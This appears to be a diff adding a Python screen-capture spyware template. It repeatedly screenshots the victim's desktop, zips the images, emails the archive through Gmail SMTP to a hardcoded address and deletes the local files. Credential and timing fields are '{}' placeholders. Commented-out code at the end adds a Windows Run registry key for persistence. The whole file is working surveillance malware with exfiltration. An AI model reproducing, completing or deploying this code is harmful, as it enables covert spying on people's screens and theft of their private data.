@@ -1,0 +1,98 @@
+from smtplib import *
+import email
+import mimetypes
+import email.mime.application
+from email import *
+from email.mime import *
+import zipfile
+import random
+import time
+import pyautogui
+import os
+import smtplib
+import time                                                         
+from email.mime.multipart import MIMEMultipart     
+mail="{}"
+password="{}"
+def main():
+ create_dir()
+ get_screenshot()
+def login():
+ global server
+ try:
+  server=smtplib.SMTP('smtp.gmail.com',587)
+  #print("Connected to SMTP server")
+ except SMTPConnectError:
+  #print("Error with connection!")
+  exit()
+ server.starttls()
+ try:
+  server.login(mail,password)
+  #print ("Login Succsessful")
+ except SMTPAuthenticationError:
+  #print ("Wrong password or email!")
+  exit()
+ send()
+def attach_zip():
+ with open(zip_name,'rb') as zip_file:
+  att = email.mime.application.MIMEApplication(zip_file.read(),_subtype="zip")
+  att.add_header('Content-Disposition','attachment',filename=zip_name)
+  return att
+def send():
+ msg = MIMEMultipart()
+ msg['Subject'] = 'EyE archive'
+ msg['From'] = 'zert.sad@gmail.com'
+ msg['To'] = 'zert.sad@gmail.com'
+ msg.attach(attach_zip())
+ try:
+   server.sendmail('zert.sad@gmail.com',['zert.sad@gmail.com'], msg.as_string())
+ except Exception:
+   print ("Error(SMTPSenderRefused)")
+   exit()
+ #print("Deleting arhive and folder..")
+ os.remove(zip_name);os.rmdir(dir)
+def get_screenshot():
+ number=0
+ #print("Staring getting pictures...")
+ while True:
+  number+=1
+  try:
+   screenshot = pyautogui.screenshot()
+   screenshot.save(str(number)+".png")
+  except:
+   print("Error")
+   continue 
+  time.sleep({})
+  if number == {}: 
+   create_zip()
+   login()
+   create_dir()
+   number=0
+def get_name():
+ name=""
+ sym=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y''z','1','2','3','4','5','6','7','8','9','0']
+ for o in range(0,4):
+  name+=random.choice(sym)
+ return name
+def create_dir():
+ global dir,orig_path
+ orig_path=os.path.join(__file__,os.getcwd())
+ dir=get_name()
+ os.mkdir(dir);os.chdir(dir)
+def create_zip():
+ global zip_name
+ os.chdir(orig_path)
+ zip_name=get_name()+'.zip' 
+ with zipfile.ZipFile(zip_name,'w') as zip:
+  for image in os.listdir(dir): 
+   zip.write(os.path.join(dir,image))
+   os.remove(os.path.join(dir,image))  
+if __name__=="__main__":
+ main()
+#from winreg import *
+#
+#key_my = OpenKey(HKEY_CURRENT_USER, 
+#                 r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
+#                 0, KEY_ALL_ACCESS)
+# 
+#SetValueEx(key_my, 'mynotepad', 0, REG_SZ, r'C:\Windows\System32\notepad.exe')
